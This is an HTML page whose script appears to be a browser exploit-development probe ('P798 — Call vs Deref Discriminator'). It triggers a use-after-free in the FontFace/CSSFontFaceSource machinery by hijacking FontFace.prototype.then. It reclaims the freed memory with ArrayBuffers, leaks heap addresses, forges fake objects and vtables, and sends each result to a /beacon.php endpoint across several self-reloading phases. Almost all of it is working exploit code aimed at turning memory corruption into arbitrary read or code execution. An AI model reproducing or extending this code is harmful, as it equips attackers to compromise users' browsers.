<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P798 — Call vs Deref Discriminator</title>
<style>
  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
</style>
<script>
'use strict';
/* ============================================================
 * P798 — Call vs Deref Discriminator
 *
 * P797 CONFIRMED: engine reads vtable[3] (offset 24), vtable[4]
 * (offset 32), and vtable[6] (offset 48). NULL entries = skip.
 *
 * CRITICAL QUESTION: When the engine reads a non-NULL vtable
 * entry, does it:
 *   (a) CALL it as a function pointer → crash on heap addr
 *   (b) DEREFERENCE it as a data pointer → follow to next level
 *
 * TEST: set vtable[3] = self+0x70 (a VALID READABLE heap addr
 * pointing into our own AB at q14). Then:
 *   - If CALL model: engine calls (self+0x70) → NX fault → crash
 *   - If DEREF model: engine reads [self+0x70] = q14 → continues
 *
 * Phase A: vtable[3]=self+0x70, q14=0 (NULL landing pad)
 *   → SURVIVE = data deref model (ARBITRARY READ possible!)
 *   → CRASH = function call model (need code address for exploit)
 *
 * Phase B: vtable[3]=self+0x70, q14=0x4242 (crash marker)
 *   → If A survived: crash here = engine processes q14 value
 *   → If A crashed: this also crashes (same reason)
 *
 * Phase C: vtable[3]=self+0x70, q14=self+0x80 (5th level!)
 *   q16=0 (NULL landing)
 *   → If deref model: engine follows 5 levels deep
 *
 * Phase D: Baseline with REAL q13, NO warmup ABs
 *   → Tests if freed CSSFontFaceSource vtable is intact
 *   → SURVIVE = real vtable still readable → code address reachable
 *
 * Phase E: vtable[4]=self+0x70, vtable[3,6]=0, q14=0
 *   → Tests offset 32 independently (same call vs deref test)
 *
 * CRASH_CLASS: HIGH — controlled pointer chain
 * ============================================================ */

window.onerror = function(msg, url, line){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P798-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
};

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P798-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
}

var out;
function log(s){ if(out) out.textContent += s + '\n'; }

var PHASES = ['A','B','C','D','E'];

function getPhase(){
  try { return localStorage.getItem('p798_phase') || 'A'; }
  catch(e){ return 'A'; }
}
function setPhase(p){
  try { localStorage.setItem('p798_phase', p); } catch(e){}
}

function run(){
  out = document.getElementById('out');
  out.textContent = '';

  var phase = getPhase();
  b('BOOT', 'phase=' + phase);
  log('P798 — Call vs Deref — Phase ' + phase + '\n');

  var idx = PHASES.indexOf(phase);
  if (idx < 0 || idx >= PHASES.length){
    log('All phases complete!');
    b('ALLCOMPLETE', '');
    try { localStorage.removeItem('p798_phase'); } catch(e){}
    return;
  }

  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
  setPhase(nextPhase);

  if (phase === 'A'){
    log('Phase A: vtable[3]=self+0x70, q14=0 (NULL landing)');
    log('SURVIVE = data deref model   CRASH = function call model\n');
    doTest('A', false, function(view1, q11_1, q13_1){
      var self = q11_1 - 0x68n;
      view1[13] = self + 0x10n;       /* q13 → fake obj at q2 */
      view1[2] = self + 0x20n;        /* q2 → vtable at q4 */
      view1[3] = 0n;
      for (var i = 4; i <= 10; i++) view1[i] = 0n;
      view1[7] = self + 0x70n;        /* vtable[3] → points to q14 */
      view1[14] = 0n;                 /* q14 = NULL landing pad */
      view1[15] = 0n; view1[16] = 0n;
      b('A-SET', 'vt3=self+0x70|q14=0|self=0x' + h16(self));
    });
  } else if (phase === 'B'){
    log('Phase B: vtable[3]=self+0x70, q14=0x4242 (crash marker)');
    doTest('B', false, function(view1, q11_1, q13_1){
      var self = q11_1 - 0x68n;
      view1[13] = self + 0x10n;
      view1[2] = self + 0x20n;
      view1[3] = 0n;
      for (var i = 4; i <= 10; i++) view1[i] = 0n;
      view1[7] = self + 0x70n;        /* vtable[3] → q14 */
      view1[14] = 0x4242424242424242n; /* q14 = crash marker */
      view1[15] = 0n; view1[16] = 0n;
      b('B-SET', 'vt3=self+0x70|q14=0x4242|self=0x' + h16(self));
    });
  } else if (phase === 'C'){
    log('Phase C: vtable[3]=self+0x70, q14=self+0x80, q16=0 (5th level)');
    doTest('C', false, function(view1, q11_1, q13_1){
      var self = q11_1 - 0x68n;
      view1[13] = self + 0x10n;
      view1[2] = self + 0x20n;
      view1[3] = 0n;
      for (var i = 4; i <= 10; i++) view1[i] = 0n;
      view1[7] = self + 0x70n;        /* vtable[3] → q14 */
      view1[14] = self + 0x80n;       /* q14 → q16 (5th level) */
      view1[15] = 0n;
      view1[16] = 0n;                 /* q16 = NULL (5th level stop) */
      view1[17] = 0n; view1[18] = 0n;
      b('C-SET', 'vt3=self+0x70|q14=self+0x80|q16=0|self=0x' + h16(self));
    });
  } else if (phase === 'D'){
    log('Phase D: BASELINE — real q13, NO warmup ABs');
    log('Tests if freed CSSFontFaceSource vtable is intact\n');
    doTest('D', true, function(view1, q11_1, q13_1){
      /* DON'T modify anything — leave real q13 intact */
      /* NO warmup ABs (skipWarmup=true) */
      b('D-SET', 'q13=REAL|q13=0x' + h16(q13_1) + '|noWarmup');
    });
  } else if (phase === 'E'){
    log('Phase E: vtable[4]=self+0x70, q14=0 (test offset 32)');
    doTest('E', false, function(view1, q11_1, q13_1){
      var self = q11_1 - 0x68n;
      view1[13] = self + 0x10n;
      view1[2] = self + 0x20n;
      view1[3] = 0n;
      for (var i = 4; i <= 10; i++) view1[i] = 0n;
      view1[8] = self + 0x70n;        /* vtable[4] → q14 */
      view1[14] = 0n;                 /* q14 = NULL */
      view1[15] = 0n; view1[16] = 0n;
      b('E-SET', 'vt4=self+0x70|q14=0|self=0x' + h16(self));
    });
  }
}

function doTest(label, skipWarmup, setupFn){
  var st1 = document.createElement('style');
  st1.textContent = '@font-face{font-family:dt1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(st1);

  var face1 = new FontFace('d1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(face1);
  void face1.loaded;

  var abs1 = [], fired1 = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired1) return undefined;
      fired1 = true;
      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
      try { document.fonts.check('1em dt1'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em d1, dt1', 'AB');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best1 = -1;
    for (var i = 0; i < abs1.length; i++){
      var v = new BigUint64Array(abs1[i]);
      if (v[0] === 1n){ best1 = i; break; }
    }
    if (best1 < 0){
      b(label + '-P1-MISS', 'no_reclaim');
      log('Pass 1 MISS. Retrying...');
      setPhase(label);
      setTimeout(function(){ location.reload(); }, 500);
      return;
    }

    var view1 = new BigUint64Array(abs1[best1]);
    var q11_1 = view1[11];
    var q13_1 = view1[13];

    b(label + '-P1-HIT', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
    log('P1 HIT: q11=0x' + h16(q11_1));

    setupFn(view1, q11_1, q13_1);

    /* Warmup — SKIP for Phase D */
    if (!skipWarmup){
      for (var i = 0; i < 128; i++) new ArrayBuffer(192);
    }

    /* Pass 2 */
    var st2 = document.createElement('style');
    st2.textContent = '@font-face{font-family:dt2;src:local(Arial);unicode-range:U+0044;}';
    document.head.appendChild(st2);

    var face2 = new FontFace('d2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
    document.fonts.add(face2);
    void face2.loaded;

    var abs2 = [], fired2 = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        if (fired2) return undefined;
        fired2 = true;
        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
        try { document.fonts.delete(this); } catch(e){}
        document.body.offsetHeight;

        for (var k = 0; k < 64; k++){
          var ab = new ArrayBuffer(192);
          var v = new BigUint64Array(ab);
          v[1] = q11_1;
          abs2.push(ab);
        }

        try { document.fonts.check('1em dt2'); } catch(e){}
        document.body.offsetHeight;
        return undefined;
      },
      set: function(){}
    });

    document.fonts.load('1em d2, dt2', 'CD');

    setTimeout(function(){
      delete FontFace.prototype.then;

      var best2 = -1;
      for (var i = 0; i < abs2.length; i++){
        var v = new BigUint64Array(abs2[i]);
        if (v[0] === 1n){ best2 = i; break; }
      }

      if (best2 < 0){
        b(label + '-P2-MISS', 'no_reclaim');
        log('Pass 2 MISS');
      } else {
        var view2 = new BigUint64Array(abs2[best2]);
        b(label + '-P2-HIT', 'i=' + best2 +
          '|q0=0x' + h16(view2[0]) +
          '|q11=0x' + h16(view2[11]) +
          '|q13=0x' + h16(view2[13]));
        log('P2 HIT (#' + best2 + ')');

        /* Dump pass1 AB state for side-effect detection */
        var se = [];
        for (var q = 0; q < 24; q++){
          if (q === 0 || q === 11 || q === 12 || q === 13) continue;
          var val = view1[q];
          if (val !== 0n) se.push('q' + q + '=0x' + h16(val));
        }
        if (se.length > 0){
          b(label + '-SIDEEFFECT', se.join('|').slice(0,600));
          log('Side effects: ' + se.join(', '));
        }

        /* For Phase D: dump pass1 AB q14-q23 for engine writes beyond q13 */
        if (label === 'D'){
          var extra = [];
          for (var q = 14; q < 24; q++){
            if (view1[q] !== 0n) extra.push('q' + q + '=0x' + h16(view1[q]));
          }
          b('D-EXTRA', extra.length > 0 ? extra.join('|') : 'all_zero');
        }
      }

      b(label + '-SURVIVED', 'pass2_complete');
      log('*** Phase ' + label + ' SURVIVED ***\n');

      setTimeout(function(){ location.reload(); }, 500);
    }, 500);
  }, 400);
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script>
</head>
<body>
  <pre id="out">P798 — Call vs Deref — Loading...</pre>
</body>
</html>
